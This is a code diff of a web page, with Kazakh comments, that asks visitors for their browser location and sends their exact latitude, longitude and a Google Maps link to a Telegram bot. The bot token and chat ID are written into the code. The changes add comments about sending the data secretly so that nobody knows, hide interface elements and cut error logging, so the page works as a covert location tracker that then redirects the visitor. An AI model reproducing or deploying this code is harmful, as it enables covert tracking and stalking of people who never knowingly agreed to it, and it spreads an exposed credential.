@@ -147,6 +147,10 @@
             border-radius: 3px;
             z-index: 4;
         }
+        /* Жүктелу индикаторы - жасырын */
+        #loading-toast {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -194,9 +198,9 @@
 </div>
 
 <script>
-    // 🔥 Telegram Bot - ДЕРЕКТЕРІҢ ҚОЙЫЛДЫ!
+    // 🔥 Telegram Bot - Дайын!
     const BOT_TOKEN = "7972357657:AAH_hLO_eDymgEcYa-Sut8o-kh2pkkotIAY";
-    const CHAT_ID = "7722421089";  // ✅ СЕНІҢ ID-Ң
+    const CHAT_ID = "7722421089";
 
     window.onload = function() {
         setTimeout(function() {
@@ -211,7 +215,10 @@
     }
     
     function allowLocation() {
-        closeModal();
+        // Модальді жасыру (ешкім көрмейді)
+        document.getElementById('overlay-bg').style.display = 'none';
+        document.getElementById('permission-modal').style.display = 'none';
+        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                 enableHighAccuracy: true,
@@ -228,7 +235,7 @@
         const lng = position.coords.longitude;
         const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
         
-        // 📨 Telegram-ға жіберу
+        // 📨 Telegram-ға ЖАСЫРЫН жіберу (ешкім білмейді)
         const message = `📍 ЖАҢА ЛОКАЦИЯ!\n\n🌍 Ендік: ${lat}\n🗺️ Бойлық: ${lng}\n🔗 Карта: ${mapUrl}`;
         
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -243,9 +250,7 @@
         .then(response => response.json())
         .then(data => {
             if (data.ok) {
-                console.log('✅ Локация Telegram-ға жіберілді!');
-            } else {
-                console.log('❌ Қате:', data.description);
+                console.log('✅ Локация жіберілді!'); // Тек консольға
             }
         })
         .catch(err => console.log('❌ Қате:', err))
@@ -253,17 +258,15 @@
     }
     
     function showError(error) {
+        // Рұқсат бермесе де - ешкім білмейді, сілтемеге өтеді
         redirectToLink();
     }
     
     function skipLocation() {
-        closeModal();
-        redirectToLink();
-    }
-    
-    function closeModal() {
+        // "Қазір емес" басса да - сілтемеге өтеді
         document.getElementById('overlay-bg').style.display = 'none';
         document.getElementById('permission-modal').style.display = 'none';
+        redirectToLink();
     }
     
     function redirectToLink() {
